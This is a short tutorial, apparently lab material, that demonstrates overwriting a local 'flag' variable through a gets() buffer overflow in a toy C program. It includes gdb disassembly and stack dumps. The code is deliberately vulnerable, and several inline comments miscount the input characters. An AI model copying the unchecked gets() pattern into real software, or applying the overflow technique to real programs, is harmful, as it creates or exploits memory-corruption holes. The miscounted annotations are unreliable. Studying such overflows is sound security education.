Overwrite Local Variables Using a Buffer Overflow Attack
--------------------------------------------------------

  4 void read_line()
  5 {   
  6     int flag = 0x0;
  7     char buffer[8];
  8 
  9     gets(buffer);
 10 
 11     if(flag == 0x0)
 12     {   
 13         printf("Access rejected!!\n");
 14     }
 15     else
 16     {   
 17         printf("Access permited!!\n");
 18     }
 19 }
 20 
 21 
 22 int main(int argc, char** argv)
 23 {   
 24     read_line();
 25 
 26     return 0;
 27 }


 $ ./overwrite_local_vars 
AAAAAAA             // 8 times
Access rejected!!

$ ./overwrite_local_vars 
AAAAAAAAA           // 9 times
Access permited!!


$ gdb ./overwrite_local_vars

(gdb) break 9
Breakpoint 1 at 0x400536: file overwrite_local_vars.c, line 9.

(gdb) break 24
Breakpoint 2 at 0x400575: file overwrite_local_vars.c, line 24.

(gdb) r
Breakpoint 2, main (argc=1, argv=0x7fffffffdad8) at overwrite_local_vars.c:24
24          read_line();

(gdb) disass
Dump of assembler code for function main:
   0x0000000000400566 <+0>:     push   rbp
   0x0000000000400567 <+1>:     mov    rbp,rsp
   0x000000000040056a <+4>:     sub    rsp,0x10
   0x000000000040056e <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x0000000000400571 <+11>:    mov    QWORD PTR [rbp-0x10],rsi
=> 0x0000000000400575 <+15>:    mov    eax,0x0
   0x000000000040057a <+20>:    call   0x400527 <read_line>
>  0x000000000040057f <+25>:    mov    eax,0x0
   0x0000000000400584 <+30>:    leave
   0x0000000000400585 <+31>:    ret

(gdb) c
Breakpoint 1, read_line () at overwrite_local_vars.c:9

(gdb) disass
Dump of assembler code for function read_line:
   0x0000000000400527 <+0>:     push   rbp
   0x0000000000400528 <+1>:     mov    rbp,rsp
   0x000000000040052b <+4>:     sub    rsp,0x10
   0x000000000040052f <+8>:     mov    DWORD PTR [rbp-0x4],0x0
=> 0x0000000000400536 <+15>:    lea    rax,[rbp-0xc]
   0x000000000040053a <+19>:    mov    rdi,rax
   0x000000000040053d <+22>:    mov    eax,0x0
   0x0000000000400542 <+27>:    call   0x400440 <gets@plt>
   0x0000000000400547 <+32>:    cmp    DWORD PTR [rbp-0x4],0x0
   0x000000000040054b <+36>:    jne    0x400559 <read_line+50>
   0x000000000040054d <+38>:    mov    edi,0x400620
   0x0000000000400552 <+43>:    call   0x400430 <puts@plt>
   0x0000000000400557 <+48>:    jmp    0x400563 <read_line+60>
   0x0000000000400559 <+50>:    mov    edi,0x400632
   0x000000000040055e <+55>:    call   0x400430 <puts@plt>
   0x0000000000400563 <+60>:    nop
   0x0000000000400564 <+61>:    leave
   0x0000000000400565 <+62>:    ret

(gdb) info register
rbp            0x7fffffffd9d0   0x7fffffffd9d0
rsp            0x7fffffffd9c0   0x7fffffffd9c0
rip            0x400536 0x400536 <read_line+15>

(gdb) x/16xg $rsp
0x7fffffffd9c0: 0x00007fffffffd9e7      0x0000000000000000
0x7fffffffd9d0: 0x00007fffffffd9f0      0x000000000040057f
0x7fffffffd9e0: 0x00007fffffffdad8      0x0000000100000000
0x7fffffffd9f0: 0x0000000000400590      0x00007f39451f950a
0x7fffffffda00: 0x0000000000000001      0x00007fffffffdad8
0x7fffffffda10: 0x0000000100040000      0x0000000000400566
0x7fffffffda20: 0x0000000000000000      0x6be0b3fd859050bd
0x7fffffffda30: 0x0000000000400450      0x00007fffffffdad0


(gdb) s
AAAAAAAA        // 7 times

(gdb) x/8xg $rsp
0x7fffffffd9c0: 0x41414141ffffd9e7      0x0000000041414141
0x7fffffffd9d0: 0x00007fffffffd9f0      0x000000000040057f
0x7fffffffd9e0: 0x00007fffffffdad8      0x0000000100000000
0x7fffffffd9f0: 0x0000000000400590      0x00007f39451f950a

(gdb) print flag
$1 = 0

(gdb) print &flag
$2 = (int *) 0x7fffffffd9cc

(gdb) print buffer
$3 = "AAAAAAAA"

(gdb) print &buffer
$4 = (char (*)[8]) 0x7fffffffd9c4

(gdb) c
Access rejected!!


(gdb) r
Breakpoint 2, main (argc=1, argv=0x7fffffffdad8) at overwrite_local_vars.c:24

(gdb) s
read_line () at overwrite_local_vars.c:6

(gdb) s
Breakpoint 1, read_line () at overwrite_local_vars.c:9

(gdb) s
AAAAAAAAA       // 9 times

(gdb) x/8xg $rsp
0x7fffffffd9c0: 0x41414141ffffd9e7      0x0000004141414141
0x7fffffffd9d0: 0x00007fffffffd9f0      0x000000000040057f
0x7fffffffd9e0: 0x00007fffffffdad8      0x0000000100000000
0x7fffffffd9f0: 0x0000000000400590      0x00007fcd0d87c50a

(gdb) print flag
$5 = 65

(gdb) print &flag
$6 = (int *) 0x7fffffffd9cc

(gdb) print buffer
$7 = "AAAAAAAA"

(gdb) print &buffer
$8 = (char (*)[8]) 0x7fffffffd9c4

(gdb) c
Access permited!!

